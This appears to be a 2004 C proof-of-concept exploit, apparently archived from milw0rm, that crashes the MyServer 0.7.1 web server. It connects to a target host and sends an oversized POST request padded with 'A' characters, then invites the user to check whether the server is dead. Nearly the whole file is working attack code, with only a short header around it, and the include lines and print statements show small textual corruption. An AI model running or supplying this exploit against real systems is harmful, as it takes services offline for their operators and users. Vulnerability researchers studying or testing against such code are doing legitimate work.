/****************************/ 
PoC to crash the server 
/****************************/ 

/* MyServer 0.7.1 POST Denial Of Service 
vendor URL: 
http://www.myserverproject.net 

coded and discovered by: 
badpack3t 
for .:sp research labs:. 
www.security-protocols.com 
9.20.2004 
Tested on Mandrake 10.0 

usage: 
sp-myserv-0.7.1 [targetport] (default is 80) 
*/ 

#include <'winsock2.h> 
#include <'stdio.h> 

#pragma comment(lib, "ws2_32.lib") 

char exploit[] = 

"POST index.html?View=Logon HTTP/1.1 " 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
": ihack.ms "; 

int main(int argc, char *argv[]) 
{ 
WSADATA wsaData; 
WORD wVersionRequested; 
struct hostent *pTarget; 
struct sockaddr_in sock; 
char *target; 
int port,bufsize; 
SOCKET mysocket; 

if (argc < 2) 
{ 
printf("MyServer 0.7.1 POST DoS by badpack3t ", argv[0]); 
printf("Usage: %s [targetport] (default is 80) ", argv[0]); 
printf("www.security-protocols.com ", argv[0]); 
exit(1); 
} 

wVersionRequested = MAKEWORD(1, 1); 
if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1; 

target = argv[1]; 
port = 80; 

if (argc >= 3) port = atoi(argv[2]); 
bufsize = 1024; 
if (argc >= 4) bufsize = atoi(argv[3]); 

mysocket = socket(AF_INET, SOCK_STREAM, 0); 
if(mysocket==INVALID_SOCKET) 
{ 
printf("Socket error! "); 
exit(1); 
} 

printf("Resolving Hostnames... "); 
if ((pTarget = gethostbyname(target)) == NULL) 
{ 
printf("Resolve of %s failed ", argv[1]); 
exit(1); 
} 

memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length); 
sock.sin_family = AF_INET; 
sock.sin_port = htons((USHORT)port); 

printf("Connecting... "); 
if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) ))) 
{ 
printf("Couldn't connect to host. "); 
exit(1); 
} 

printf("Connected!... "); 
printf("Sending Payload... "); 
if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1) 
{ 
printf("Error Sending the Exploit Payload "); 
closesocket(mysocket); 
exit(1); 
} 

printf("Payload has been sent! Check if the webserver is dead! "); 
closesocket(mysocket); 
WSACleanup(); 
return 0; 
}

// milw0rm.com [2004-09-27]